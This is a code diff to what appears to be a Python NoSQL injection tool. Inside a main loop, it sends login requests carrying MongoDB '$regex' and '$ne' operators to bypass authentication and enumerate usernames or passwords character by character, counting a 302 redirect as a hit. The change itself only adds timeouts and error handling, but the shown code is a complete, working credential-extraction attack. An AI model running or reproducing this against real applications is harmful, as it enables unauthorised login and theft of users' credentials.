@@ -49,27 +49,40 @@ def main():
 
     for payload in payloads:
         para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
-        r = method(url, data=para, allow_redirects=False)
 
-        if r.status_code == 302:
-            loop = True
-            print(Fore.GREEN + f"Pattern found that starts with '{payload[0]}'")
-            userpass = payload
-            while loop:
-                loop = False
-                for char in characters:
-                    new_payload = userpass + char
-                    para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
-                    r = method(url, data=para)
+        try:
+            r = method(url, data=para, allow_redirects=False, timeout=5)  # Set a timeout in seconds
+            r.raise_for_status()  # Check if the request was successful (status code in the 2xx range)
 
-                    if r.status_code == 302:
-                        print(Fore.YELLOW + f"Pattern found: {new_payload}")
-                        userpass = new_payload
-                        loop = True
+            if r.status_code == 302:
+                loop = True
+                print(Fore.GREEN + f"Pattern found that starts with '{payload[0]}'")
+                userpass = payload
+                while loop:
+                    loop = False
+                    for char in characters:
+                        new_payload = userpass + char
+                        para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
 
-            print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
-            final_output.append(userpass)
-            count += 1
+                        try:
+                            r = method(url, data=para, timeout=5)  # Set a timeout in seconds
+                            r.raise_for_status()  # Check if the request was successful (status code in the 2xx range)
+
+                            if r.status_code == 302:
+                                print(Fore.YELLOW + f"Pattern found: {new_payload}")
+                                userpass = new_payload
+                                loop = True
+
+                        except requests.exceptions.RequestException as e:
+                            print(Fore.RED + "Error occurred during request:", e)
+                            break
+
+                print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
+                final_output.append(userpass)
+                count += 1
+
+        except requests.exceptions.RequestException as e:
+            print(Fore.RED + "Error occurred during request:", e)
 
     if count == 0:
         print(Fore.RED + f"No {enum_parameter} found")
@@ -79,4 +92,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
